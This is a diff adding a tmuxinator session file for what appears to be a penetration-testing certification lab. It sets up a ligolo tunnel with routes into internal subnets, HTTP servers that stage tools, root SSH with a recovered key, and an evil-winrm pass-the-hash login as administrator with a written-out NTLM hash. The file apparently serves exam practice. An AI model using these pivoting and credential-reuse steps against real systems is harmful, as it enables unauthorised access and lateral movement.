@@ -1,0 +1,66 @@
+# /home/kali/.config/tmuxinator/cptsLab.yml
+
+name: cptsLab
+root: ~/Dropbox/40-49_Career/41-Courses/41.22-CPTS/Exam/Org
+
+startup_window: webshell
+
+windows:
+  - btop:
+      root: ~/
+      layout: even-vertical
+      panes:
+        - btop
+  - emacs:
+      root: ~/Dropbox/40-49_Career/41-Courses/41.22-CPTS/Exam/Org/Data/
+      layout: even-vertical
+      panes:
+        - emacs:
+          - cl
+          - emacs
+  - ligolo:
+      root: ~/
+      layout: tiled
+      panes:
+        - ligolo:
+          - lgu
+        - linux-python-server:
+            - cd ~/Desktop/LinuxTools
+            - ls
+            - python -m http.server 9000
+        - windows-python-server:
+            - cd ~/Desktop/WindowsTools
+            - ls
+            - python -m http.server 8000
+        - ifconfig:
+            - sleep 5
+            - sudo ip route add 172.18.0.0/24 dev ligolo && sudo ip route add 172.17.0.0/24 dev ligolo && sudo ip route add 172.16.139.0/24 dev ligolo
+            - ifconfig
+  - SSHNIX01:
+      root: ~/Dropbox/40-49_Career/41-Courses/41.22-CPTS/Exam/Org/Data/
+      layout: even-vertical
+      panes:
+        - ssh:
+          - cl
+          - cd Data/Subnet-1/NIX01-10.129.192.232
+          - ssh -i root_id_rsa root@$IP
+  - PH-NIX01-Server:
+      root: ~/Dropbox/40-49_Career/41-Courses/41.22-CPTS/Exam/Org/Data/
+      layout: even-vertical
+      panes:
+        - PH1WS:
+          - cl
+          - sleep 15
+          - cd Data/Subnet-1/NIX01-10.129.192.232
+          - ssh -i root_id_rsa root@$IP
+          - sleep 5
+          - cd /tmp
+          - python3 -m http.server 9000
+
+  - EvilWinrm-MS01:
+      root: ~/Desktop/WindowsTools
+      layout: even-vertical
+      panes:
+        - PH1WS:
+          - sleep 60
+          - evil-winrm -i 172.16.139.35 -u administrator -H 'b3a92efa782776e463a52131f7d7fd89'
